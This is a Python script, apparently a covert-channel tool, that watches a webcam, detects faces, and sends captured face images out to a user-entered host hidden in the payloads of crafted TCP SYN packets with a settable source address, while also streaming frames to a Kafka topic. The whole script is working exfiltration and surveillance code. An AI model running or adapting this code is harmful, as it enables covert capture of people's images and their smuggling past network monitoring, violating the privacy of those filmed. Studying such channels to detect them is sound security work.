import cv2
from typing import Final
from scapy.all import *
from scapy.layers.inet import IP, TCP
import face_recognition
from confluent_kafka import SerializingProducer
from confluent_kafka.serialization import IntegerSerializer

# Setup for confluent_kafka
applicationID: Final[str] = "CovertChannel"
bootstrapServers: Final[str] = "localhost:9092,localhost:9093"
topicName: Final[str] = "channel"
producer_properties = {'client.id': applicationID,
                       'bootstrap.servers': bootstrapServers, 'key.serializer': IntegerSerializer()}
my_producer = SerializingProducer(producer_properties)

# Destination IP address
dst_ip_addr = ""
# Destination port
dst_port = 0
# Source IP address
src_ip_addr = ""

width = 320
height = 240


# Function to handle covert channel communication
def covert_channel(path):
    global dst_ip_addr, dst_port, src_ip_addr
    # Read image from saved file
    with open(path, "rb") as f:
        stream = f.read()

    # Fragment the image
    fragments = [stream[i:i + 1000] for i in range(0, len(stream), 1000)]

    # Initial sequence number
    sequence_number = 1000

    # Send each chunk in a separate packet
    for chunk in fragments:
        # Add chunk as payload to the packet
        network_packet = IP(src=src_ip_addr, dst=dst_ip_addr) / TCP(seq=sequence_number, dport=dst_port,
                                                                    sport=RandShort(),
                                                                    flags='S') / chunk
        # Update sequence number
        sequence_number += len(chunk)
        # Send packet
        send(network_packet)
    print("done")


# State variable to track face_detection events
previous_face_detection_state = False


# Function to intercept video stream from webcam
def intercept_video_stream(video_device):
    global dst_ip_addr, dst_port, src_ip_addr, previous_face_detection_state

    # Request input
    dst_ip_addr = input("Destination IP Address: ")
    dst_port = int(input("Destination Port: "))
    src_ip_addr = input("Source IP Address: ")

    # Print inputs
    print("Destination IP Address entered:", dst_ip_addr)
    print("Destination Port entered:", dst_port)
    print("Source IP Address entered:", src_ip_addr)

    # Capture video from webcam
    webcam = video_device

    i = 0
    while webcam.isOpened():

        # Retrieve the current frame from the stream
        result, video_frame = webcam.read()
        if not result:
            break
        reduced_video_frame = cv2.resize(video_frame, (0, 0), fx=0.25, fy=0.25)
        # Detect faces
        face_locations_list = face_recognition.face_locations(reduced_video_frame, number_of_times_to_upsample=2,
                                                              model='hog')

        # Verify if faces are detected
        if face_locations_list:
            # If a face is detected and the face_location_list is not empty
            # Save the image as base64
            resized_video_frame = cv2.resize(video_frame, (width, height))
            new_frame = cv2.cvtColor(resized_video_frame, cv2.COLOR_BGR2GRAY)
            cv2.imwrite("inject.jpg", new_frame)

            # Send the image only if a new face is detected
            if not previous_face_detection_state:
                # Create the cover channel
                covert_channel("inject.jpg")

                print("Image sent.")
            # Update state
            previous_face_detection_state = True
        else:
            # No faces are detected, update state
            previous_face_detection_state = False

            # Show the frame
        cv2.imshow("Webcam Video", video_frame)

        # End the loop with 'q'
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

        # Conver video_frame to bytes
        video_frame_bytes_stream = cv2.imencode('.jpg', video_frame)[1].tobytes()
        # Send video_frame_bytes_stream to the kafka topic
        my_producer.produce(topicName, key=i, value=video_frame_bytes_stream)
        my_producer.poll(0)
        i += 1

    webcam.release()
    my_producer.flush()
    cv2.destroyAllWindows()


if __name__ == '__main__':
    video = cv2.VideoCapture(0)
    intercept_video_stream(video)
